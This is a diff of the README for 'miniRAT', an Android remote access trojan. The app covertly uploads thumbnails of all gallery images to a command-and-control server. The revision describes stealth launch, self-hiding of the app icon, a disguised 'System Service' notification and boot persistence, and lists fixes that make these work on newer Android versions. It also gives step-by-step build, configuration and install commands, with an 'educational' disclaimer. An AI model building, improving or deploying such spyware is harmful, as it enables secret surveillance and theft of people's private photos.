@@ -1,59 +1,37 @@
 # miniRAT
 
-> A minimal Android Remote Access Trojan (RAT) for educational and security research purposes. This project demonstrates how a covert Android app can silently exfiltrate device gallery thumbnails to a remote command-and-control (C2) server.
-
----
-
-## Table of Contents
-
-- [Overview](#overview)
-- [Features](#features)
-- [Project Structure](#project-structure)
-- [How It Works](#how-it-works)
-- [Prerequisites](#prerequisites)
-- [Setup & Installation](#setup--installation)
-- [Configuration](#configuration)
-- [Running the C2 Server](#running-the-c2-server)
-- [Building the Android APK](#building-the-android-apk)
-- [API Reference](#api-reference)
-- [Permissions](#permissions)
-- [Known Limitations](#known-limitations)
-- [Disclaimer](#disclaimer)
+> A minimal Android Remote Access Trojan (RAT) for educational and security research purposes. Demonstrates covert gallery thumbnail exfiltration to a remote C2 server.
 
 ---
 
 ## Overview
 
-miniRAT is a two-component system:
-
 | Component | Technology | Description |
 |---|---|---|
-| **Android Client** | Java, Android SDK (API 21–36) | A fully stealth Android app that runs invisibly on target devices, periodically scanning the device gallery and uploading thumbnail previews to a remote server. |
-| **C2 Server** | Node.js, Express.js | A lightweight command-and-control server that receives uploaded thumbnails, stores them on disk, and serves a web-based gallery viewer for the operator. |
-
-The project is intentionally minimal — it focuses on a single RAT capability (gallery thumbnail exfiltration) to demonstrate the core patterns of Android RAT design: stealth entry, background persistence, data exfiltration, and remote data viewing.
+| **Android Client** | Java, Android SDK (API 21–36) | Stealth app that silently scans the device gallery and uploads thumbnail previews to a remote server on first launch. Hides from app drawer after use. |
+| **C2 Server** | Node.js, Express.js | Receives uploaded thumbnails, stores on disk, and serves a web gallery dashboard. |
 
 ---
 
 ## Features
 
 ### Android Client
-- **Zero-UI Launch** — The app launches from the app drawer but shows absolutely no interface to the user. It appears to "do nothing" and instantly vanishes.
-- **Background Service** — A persistent background service (`ParasiteService`) runs continuously using `START_STICKY`, meaning the OS will attempt to restart it if killed.
-- **Boot Persistence** — A `BroadcastReceiver` automatically restarts the service after device reboot, covering standard boot events and HTC quick-boot variants.
-- **Gallery Scanning** — Queries the Android `MediaStore` for all JPEG images and MP4 videos on external storage.
-- **Thumbnail Generation** — Creates efficient 128×128 pixel thumbnails from gallery files, maintaining aspect ratio, and compresses to JPEG at 70% quality.
-- **Data Exfiltration** — Uploads Base64-encoded thumbnails to the C2 server via HTTP POST with JSON payloads.
-- **Stealth Notification Channel** — Creates a silent, minimum-importance notification channel for future foreground service use.
-- **Periodic Execution** — Runs the full scan-and-upload cycle every 30 seconds using a `Handler`-based periodic task.
+- **Zero-UI Launch** — Invisible activity requests storage permission, starts the service, hides from app drawer, and finishes instantly.
+- **Runtime Permissions** — Requests `READ_MEDIA_IMAGES` (Android 13+) or `READ_EXTERNAL_STORAGE` (Android 6–12) at first launch.
+- **App Drawer Hiding** — Disables its own launcher component after first run — app icon disappears permanently.
+- **Foreground Service** — Runs as a foreground service on Android 8+ with a silent "System Service" notification.
+- **One-Time Gallery Scan** — Queries MediaStore for **all image types** (JPEG, PNG, WEBP, GIF, HEIC, BMP, etc.) using ContentUris for scoped storage compatibility.
+- **Memory-Efficient Thumbnailing** — Uses `inSampleSize` for downsampled decoding and `bitmap.recycle()` for cleanup.
+- **Safe JSON Payloads** — Uses `org.json.JSONObject` to prevent JSON injection via filenames.
+- **Boot Persistence** — `BootReceiver` auto-restarts the service on reboot using `startForegroundService()`.
+- **START_STICKY** — System will attempt to restart the service if killed.
 
 ### C2 Server
-- **Thumbnail Receiver** — Accepts Base64-encoded thumbnails via POST, decodes them, and saves as JPEG files.
-- **Metadata Tracking** — Stores JSON metadata alongside each thumbnail recording the original filename and upload timestamp.
-- **Gallery Dashboard** — Serves an inline HTML/CSS/JS gallery viewer at the root URL with a responsive grid layout and auto-refresh every 30 seconds.
-- **Thumbnail Listing API** — Returns all stored thumbnails sorted by upload time (newest first).
-- **Full-Size File Serving** — Optional endpoint to serve full-resolution files from the uploads directory.
-- **CORS Enabled** — Accepts requests from any origin for cross-origin development/testing.
+- **Thumbnail Receiver** — Accepts Base64-encoded thumbnails via POST, decodes and saves as JPEG.
+- **Metadata Tracking** — JSON metadata alongside each thumbnail with original filename and upload timestamp.
+- **Gallery Dashboard** — Responsive HTML/CSS/JS gallery at root URL with 30-second auto-refresh.
+- **Thumbnail Listing API** — Returns all stored thumbnails sorted newest first.
+- **CORS Enabled** — Accepts requests from any origin.
 
 ---
 
@@ -62,27 +40,20 @@ The project is intentionally minimal — it focuses on a single RAT capability (
 ```
 miniRAT/
 ├── app/
-│   ├── build.gradle.kts              # Android build config, dependencies, BuildConfig injection
-│   ├── local.properties              # DOMAIN_URL for C2 server (not committed to git)
-│   ├── proguard-rules.pro            # ProGuard rules (minification disabled)
-│   └── src/
-│       └── main/
-│           ├── AndroidManifest.xml    # Permissions, components, intent filters
-│           └── java/com/app/minirat/
-│               ├── HiddenActivity.java   # Stealth launcher — starts service, finishes immediately
-│               ├── MainActivity.java     # Placeholder decoy — finishes immediately, unused
-│               ├── Service.java          # ParasiteService — core RAT payload (gallery exfiltration)
-│               └── BootReceiver.java     # BroadcastReceiver — persistence across reboots
+│   ├── build.gradle.kts              # Build config, dependencies, BuildConfig injection
+│   ├── local.properties              # DOMAIN_URL for C2 server
+│   └── src/main/
+│       ├── AndroidManifest.xml       # Permissions, components, intent filters
+│       └── java/com/app/minirat/
+│           ├── HiddenActivity.java   # Stealth launcher → permission → service → hide → finish
+│           ├── Service.java          # Core service — gallery scan + thumbnail upload
+│           └── BootReceiver.java     # Persistence — restarts service on boot
 ├── server.js                         # Node.js C2 server (Express)
-├── build.gradle.kts                  # Root Gradle build file
-├── settings.gradle.kts               # Gradle settings
-├── gradle.properties                 # Gradle JVM configuration
-├── gradlew / gradlew.bat             # Gradle wrapper scripts
-└── .claude/                          # Project documentation (this folder)
+└── .claude/                          # Project documentation
     ├── README.md                     # This file
-    ├── ARCHITECTURE.md               # System architecture deep-dive
-    ├── ANALYSIS.md                   # Code analysis, bugs, security review
-    └── CONTEXT.md                    # Project context, conventions, developer guide
+    ├── ARCHITECTURE.md               # System architecture
+    ├── ANALYSIS.md                   # Remaining issues & recommendations
+    └── CONTEXT.md                    # Developer guide & conventions
 ```
 
 ---
@@ -93,211 +64,75 @@ miniRAT/
 
 ```
 1. User installs APK (sideloaded)
-2. User taps app icon in app drawer
-3. HiddenActivity launches (zero UI)
-   ├── Sets fullscreen invisible window flags
-   ├── Starts ParasiteService
-   └── Calls finish() — activity disappears instantly
-4. ParasiteService begins background loop (every 30s):
-   ├── Queries MediaStore for all JPEG/MP4 files
-   ├── For each file:
-   │   ├── Decodes bitmap from file path
+2. User taps app icon in drawer
+3. HiddenActivity launches (invisible)
+   ├── Requests READ_MEDIA_IMAGES / READ_EXTERNAL_STORAGE permission
+   ├── Starts Service (foreground on Android 8+)
+   ├── Disables launcher component → app disappears from drawer
+   └── finish() — activity gone
+4. Service runs one-time gallery scan:
+   ├── Queries MediaStore for ALL image types via ContentURIs
+   ├── For each image:
+   │   ├── Decodes with inSampleSize (memory-efficient)
    │   ├── Scales to 128×128 thumbnail
    │   ├── Encodes as Base64 JPEG
-   │   └── POST to {DOMAIN_URL}/upload/thumbnail
-   └── Schedules next cycle in 30 seconds
+   │   └── POST to {DOMAIN_URL}/api/upload/thumbnail
+   └── Scan complete — service stays alive
 5. On device reboot:
-   └── BootReceiver fires → restarts ParasiteService
+   └── BootReceiver → startForegroundService() → re-scans gallery
 ```
-
-### Server Flow
-
-```
-1. Server receives POST /api/upload/thumbnail
-   ├── Decodes Base64 thumbnail data
-   ├── Saves as {filename}_thumb.jpg in ./uploads/
-   └── Saves {filename}.metadata.json with timestamp
-2. Operator visits http://server:3000/
-   └── Gallery viewer loads thumbnails from GET /api/thumbnails
-       └── Displays in responsive grid, refreshes every 30s
-```
-
----
-
-## Prerequisites
-
-### Android Client
-- Android Studio (latest stable)
-- JDK 11+
-- Android SDK with API Level 36
-- A physical Android device or emulator (API 21+)
-
-### C2 Server
-- Node.js 16+
-- npm
-
----
-
-## Setup & Installation
-
-### 1. Clone the Repository
-
-```bash
-git clone https://github.com/Rhishavhere/miniRAT.git
-cd miniRAT
-```
-
-### 2. Configure the C2 Domain
-
-Edit `app/local.properties` (create if it doesn't exist):
-
-```properties
-DOMAIN_URL=https://your-server-domain.com
-```
-
-This URL is injected into `BuildConfig.DOMAIN_URL` at compile time. The Android client will POST thumbnails to `{DOMAIN_URL}/upload/thumbnail`.
-
-### 3. Install Server Dependencies
-
-```bash
-npm install express cors multer
-```
-
----
-
-## Configuration
-
-| Property | File | Description |
-|---|---|---|
-| `DOMAIN_URL` | `app/local.properties` | The C2 server URL the Android client uploads to |
-| `SERVER_URL` | `Service.java` (via BuildConfig) | Reads `DOMAIN_URL` from BuildConfig at runtime |
-| Port `3000` | `server.js` | The port the C2 server listens on |
-| `30000` ms | `Service.java` L70, L73 | The interval between scan-and-upload cycles |
-| `128×128` px | `Service.java` L166-167 | Thumbnail resolution |
-| JPEG quality `70` | `Service.java` L183 | Thumbnail compression quality |
-
----
-
-## Running the C2 Server
-
-```bash
-node server.js
-```
-
-Output:
-```
-RAT server running at http://localhost:3000
-```
-
-The gallery viewer is available at `http://localhost:3000/`. Thumbnails are stored in `./uploads/`.
-
----
-
-## Building the Android APK
-
-1. Open the project in Android Studio.
-2. Ensure `local.properties` has the correct `DOMAIN_URL`.
-3. Build → Build Bundle(s) / APK(s) → Build APK(s).
-4. The APK will be at `app/build/outputs/apk/debug/app-debug.apk`.
-
----
-
-## API Reference
-
-### `POST /api/upload/thumbnail`
-
-Upload a gallery thumbnail to the server.
-
-**Request Body** (JSON):
-```json
-{
-  "filename": "IMG_20240101_120000.jpg",
-  "thumbnail": "<base64-encoded-jpeg-data>"
-}
-```
-
-**Response** (200 OK):
-```json
-{
-  "success": true,
-  "message": "Thumbnail uploaded successfully",
-  "filename": "IMG_20240101_120000.jpg",
-  "thumbnailPath": "IMG_20240101_120000.jpg_thumb.jpg"
-}
-```
-
----
-
-### `GET /api/thumbnails`
-
-List all uploaded thumbnails, sorted newest first.
-
-**Response** (200 OK):
-```json
-{
-  "thumbnails": [
-    {
-      "name": "IMG_20240101_120000.jpg",
-      "thumbnail": "IMG_20240101_120000.jpg_thumb.jpg",
-      "uploadedAt": "2024-01-01T12:00:00.000Z"
-    }
-  ]
-}
-```
-
----
-
-### `GET /api/fullsize/:filename`
-
-Serve a full-size file from the uploads directory.
-
-**Response**: Raw file data or `404 { "error": "File not found" }`.
-
----
-
-### `GET /`
-
-Serves the inline HTML gallery viewer dashboard.
 
 ---
 
 ## Permissions
 
-The Android client requests the following permissions:
-
-| Permission | Required | Usage |
+| Permission | API Range | Usage |
 |---|---|---|
-| `INTERNET` | ✅ | Upload thumbnails to C2 server |
-| `ACCESS_NETWORK_STATE` | ✅ | Check network connectivity |
-| `READ_EXTERNAL_STORAGE` | ✅ | Access device gallery via MediaStore |
-| `WRITE_EXTERNAL_STORAGE` | ❌ | Declared but unused in code |
-| `WAKE_LOCK` | ❌ | Declared but unused in code |
-| `RECEIVE_BOOT_COMPLETED` | ✅ | Restart service after device reboot |
+| `INTERNET` | All | Upload thumbnails to C2 server |
+| `ACCESS_NETWORK_STATE` | All | Check network connectivity |
+| `READ_EXTERNAL_STORAGE` | 21–32 | Access gallery via MediaStore |
+| `READ_MEDIA_IMAGES` | 33+ | Access gallery on Android 13+ |
+| `RECEIVE_BOOT_COMPLETED` | All | Restart service after reboot |
+| `FOREGROUND_SERVICE` | 26+ | Required for foreground service |
 
 ---
 
-## Known Limitations
+## Setup & Configuration
 
-1. **URL Path Mismatch** — The Android client POSTs to `/upload/thumbnail` but the server expects `/api/upload/thumbnail`. This will result in a 404 error. Either update the client to include `/api` prefix or adjust the server route.
+```bash
+# 1. Clone
+git clone https://github.com/Rhishavhere/miniRAT.git
+cd miniRAT
 
-2. **No Android 8+ Foreground Support** — `startForeground()` is commented out in `ParasiteService`. On Android 8+ (API 26+), background services must display a foreground notification or they will be killed. The boot receiver will also crash when calling `startService()` from background.
+# 2. Set C2 URL
+echo "DOMAIN_URL=https://your-server.com" > app/local.properties
 
-3. **No Runtime Permission Handling** — `READ_EXTERNAL_STORAGE` requires runtime permission on Android 6+ (API 23+). The app never requests it via `ActivityCompat.requestPermissions()`, so MediaStore queries will silently return empty results.
+# 3. Start server
+npm install express cors multer
+node server.js
 
-4. **No Deduplication** — Every 30-second cycle re-scans the entire gallery and re-uploads all thumbnails. There is no tracking of previously uploaded files.
+# 4. Build APK
+./gradlew assembleDebug
 
-5. **Memory Pressure** — Full-resolution bitmaps are loaded into memory before being scaled to thumbnails. Large images (e.g., 50MP photos) can cause `OutOfMemoryError`. Should use `BitmapFactory.Options.inSampleSize` for efficient downsampling.
+# 5. Install
+adb install app/build/outputs/apk/debug/app-debug.apk
+```
 
-6. **No Encryption** — Thumbnail data is transmitted as plain Base64 in JSON. While HTTPS provides transport encryption, the payload itself is unencrypted.
+---
 
-7. **JSON Injection** — Filenames are concatenated directly into JSON strings without escaping. Filenames with quotes or special characters will corrupt the JSON payload.
+## API Reference
 
-8. **Unused Compose Dependencies** — The build includes full Jetpack Compose dependencies and theme files, but the app is pure Java with no Compose UI.
+| Method | Endpoint | Description |
+|---|---|---|
+| `POST` | `/api/upload/thumbnail` | Upload Base64 thumbnail `{ filename, thumbnail }` |
+| `GET` | `/api/thumbnails` | List all thumbnails (newest first) |
+| `GET` | `/api/fullsize/:filename` | Serve full-size file |
+| `GET` | `/` | Gallery dashboard |
 
 ---
 
 ## Disclaimer
 
-> **⚠️ This project is for educational and authorized security research purposes only.**
+> **⚠️ Educational and authorized security research only.**
 >
-> Unauthorized access to computer systems and data exfiltration is illegal under computer crime laws in most jurisdictions. This software must only be installed on devices you own or have explicit authorization to test. The authors assume no liability for misuse.
+> Unauthorized access to computer systems and data exfiltration is illegal. Only install on devices you own or have explicit authorization to test.
